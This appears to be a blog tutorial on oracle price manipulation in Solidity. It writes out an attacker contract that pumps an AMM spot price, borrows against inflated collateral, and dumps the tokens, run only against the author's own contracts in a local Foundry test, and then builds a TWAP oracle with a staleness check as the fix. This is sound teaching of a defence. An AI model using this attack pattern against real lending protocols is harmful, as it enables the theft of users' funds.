+++
date = '2026-11-24T18:00:00+03:30'
draft = false
title = 'Oracles and price manipulation'
description = 'Oracles and price manipulation in Solidity: a one-transaction attack on my own AMM-priced lending market, then a TWAP oracle with a staleness check.'
categories = ["Blockchain"]
series = ["Blockchain"]
tags = ["blockchain", "solidity", "defi", "oracle", "security", "foundry"]
cover = { image = "/images/covers/bc-oracles.png", alt = "Oracles and price manipulation", hiddenInSingle = true }
+++

[Lending, collateral and liquidation](/posts/bc-lending-liquidation/) ended with a placeholder: a price the owner types in. A contract cannot fetch a price from a website. Whatever number it uses must already be on-chain, put there by someone or computed from something. That is the {{< term "oracle" "oracle" >}} problem.

The tempting answer is already deployed: the pool from [AMMs and the constant-product formula](/posts/bc-amm-constant-product/) has a price, `reserve1 / reserve0`. This post wires the lending market to that spot price, attacks it in one transaction, then fixes it. The attack runs only against my own contracts in a local Foundry test.

> Foundry 1.8.7, solc 0.8.38, macOS (arm64). I copied the previous post's project, added a cumulative price to `SimplePool` and `src/Oracles.sol` with two oracles. The attacker contract lives in `test/`. Teaching code, not audited.

## The attack

The pool holds 1,000 DEMO and 100,000 USDX, so DEMO is 100. The market lends 75% of collateral value, priced by `SpotOracle`, which returns `pool.spotPrice0()`. The attacker owns 100 DEMO (worth 10,000) and, for one transaction, 100,000 USDX. On mainnet that money would come from a {{< term "flash-loan" "flash loan" >}}: a loan that must be repaid before the transaction ends, or the whole transaction reverts. In the test, a mint stands in for it:

```solidity
function attack(uint256 loan, uint256 ownDemo) external returns (uint256 borrowed, uint256 priceSeen) {
    // 1. pump: buy DEMO with the loan, the pool's DEMO price jumps
    uint256 bought = pool.swap(address(usdx), loan, 0, address(this), block.timestamp);
    // 2. post own DEMO as collateral and borrow as much as the oracle allows
    market.deposit(ownDemo);
    priceSeen = market.oracle().price();
    borrowed = market.borrowLimit(address(this));
    market.borrow(borrowed);
    // 3. dump: sell the bought DEMO back, the price returns close to where it was
    pool.swap(address(demo), bought, 0, address(this), block.timestamp);
    // 4. repay the loan; whatever USDX is left is the attacker's
    usdx.transfer(msg.sender, loan);
}
```

```
$ forge test --mt test_SpotOracleIsDrained -vv
[PASS] test_SpotOracleIsDrained() (gas: 1261959)
Logs:
  price the market saw 399399999999999999999
  borrowed             29954999999999999999925
  USDX kept            29654550002031084112357
  profit (USDX)        19654550002031084112357
  pool price after     100300449997968915887
  market health        267869671168002446
```

Buying with 100,000 USDX pushed the spot price to 399.4, as the price impact table in the AMM post predicted. The market valued 100 DEMO at 39,940 and lent 29,955. Selling back cost about 300 in fees. After repaying the loan the attacker keeps 29,654.55 USDX and walks away from collateral worth 10,000: a profit of 19,654.55. The pool is back near 100, and the market holds a loan with health 0.27 that no liquidation can repair. That is {{< term "price-manipulation" "price manipulation" >}}, and nothing in the pool or the market had a bug. The design trusted a number anyone can move for the price of the swap fees.

As far as I know from public post-mortems, several real lending protocols lost money in this exact shape. I am not naming any, because I cannot check the details here.

## The fix: a time-weighted average

A spot price is one instant, and an attacker owns the instant inside their own transaction. An average over time is much harder to move. The pool now keeps a running sum of price times seconds, similar to Uniswap v2's cumulative price as I understand it:

```solidity
function _accumulate() internal {
    uint256 dt = block.timestamp - lastUpdate;
    if (dt > 0 && reserve0 != 0) price0Cumulative += reserve1 * 1e18 / reserve0 * dt;
    lastUpdate = block.timestamp;
}
```

It runs at the start of every swap and liquidity change, with the reserves from before. A price set inside a block only starts counting once time passes. The {{< term "twap" "TWAP" >}} is the difference of two readings divided by the seconds between them:

```solidity
function update() external {
    uint256 elapsed = block.timestamp - lastTimestamp;
    if (elapsed < window) revert WindowNotElapsed(elapsed);
    uint256 cumulative = pool.currentCumulative();
    average = (cumulative - lastCumulative) / elapsed;
    lastCumulative = cumulative;
    lastTimestamp = block.timestamp;
}

function price() external view returns (uint256) {
    uint256 age = block.timestamp - lastTimestamp;
    if (age > 2 * window) revert StalePrice(age); // refuse to lend against an old price
    return average;
}
```

Same attacker, same numbers, a market priced by a 30-minute TWAP:

```
$ forge test --mt test_TwapOracleResists -vv
  price the market saw 100000000000000000000
  borrowed             7500000000000000000000
  USDX kept            7199550002031084112432
  profit (USDX)        -2800449997968915887568
  market health        1066666666666666666
(trimmed)
```

The attacker got an honest loan, 7,500 against 10,000, and lost 300 in fees on the round trip. Walking away now costs 2,800. Even calling `update()` right after the pump changes nothing, because the pumped price had been in effect for zero seconds:

```
$ forge test --mt test_TwapIgnoresSameBlockPump -vv
  spot after pump 399399999999999999999
  twap            100000000000000000000
```

## What a TWAP costs

It lags. A real buy that moves spot to 146.33, ten minutes before the end of a 30-minute window:

```
$ forge test --mt test_TwapFollowsALastingMove -vv
  spot after a real buy 146333769999999999999
  twap over 30 minutes  115444589999999999999
```

During a crash, liquidations arrive late. And holding a price over several blocks is a different attack: harder and costly against arbitrage, but not impossible on a thin pool. Window length trades safety against freshness. If nobody calls `update()`, `price()` reverts (`test_StalePriceRefused`): borrowing stops instead of using an old price.

The other common design is a push oracle: independent reporters publish a price on-chain. Chainlink-style feeds, according to their docs, expose the answer together with an `updatedAt` timestamp. A consumer should reject old answers and sudden jumps beyond a set deviation. I did not build one here; the staleness rule above is the same idea.

## A few things to watch

- Never price collateral with a spot price from a pool that can be traded in the same transaction.
- Flash loans give anyone large capital for one transaction. "It would need a lot of money" is not a defence.
- Check freshness: an oracle that is not updated should stop borrowing, not answer quietly.
- Pick TWAP windows for the pool's depth; thin pools need longer windows or another source.

## Exercise

1. Find the smallest loan that still makes the spot-oracle attack profitable.
2. Move the attacker's `update()` call one block after the pump (`vm.roll`, `vm.warp` by 12 s). How far does the TWAP move?
3. Write a guard that refuses to borrow while spot and TWAP differ by more than 5%.

## What's next

Next post: **Contract security: reentrancy, access control and real incidents**.
